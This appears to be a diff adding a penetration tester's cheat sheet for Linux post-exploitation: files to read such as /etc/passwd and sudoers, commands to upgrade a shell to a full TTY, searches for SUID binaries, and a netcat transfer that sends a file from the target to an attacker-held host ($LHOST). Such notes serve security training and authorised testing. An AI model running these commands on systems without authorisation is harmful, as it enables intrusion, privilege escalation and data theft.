@@ -1,0 +1,39 @@
+/proc/version 
+/etc/issue
+/etc/passwd
+/etc/exports 
+/etc/sudoers.d/
+sudo -l
+history
+
+* Spawning a PTY without python, with only script inside the system-->
+/usr/bin/script -qc /bin/bash /dev/null
+export TERM=xterm-color
+
+* Bingo! Upgrade: 
+python -c 'import pty;pty.spawn("/bin/bash")'
+export SHELL=bash 
+and
+export TERM=xterm-256color
+
+* However this shell still won’t do what we want it to, so we need to get full tty for an interactive shell. 
+First, enter this python command: 
+python -c 'import pty; pty.spawn("/bin/bash")'            .Then, 
+press CTRL+Z to put the shell in the background. 
+Next, type this command in the same window: 
+stty raw -echo;fg               
+This will bring your shell back to the foreground with full interactive experience.
+
+
+* This will list files that have SUID or SGID bits set -->
+find / -type f -perm -04000 -ls 2>/dev/null 
+Searches for SUID bit set binary files -->
+find / -perm +6000 2>/dev/null | grep '/bin/'
+
+
+* Transfering files through remote servers
+sudo python -m SimpleHTTPServer 4444
+Let download this file via netcat:
+Local: nc -l -p 1234 > suspicious.pcapng
+Target: nc -w 3 $LHOST 1234 < suspicious.pcapng
+Check md5sum: md5sum suspicious.pcapng (if it matches you are good, if not do -w 5 on target netcat command)
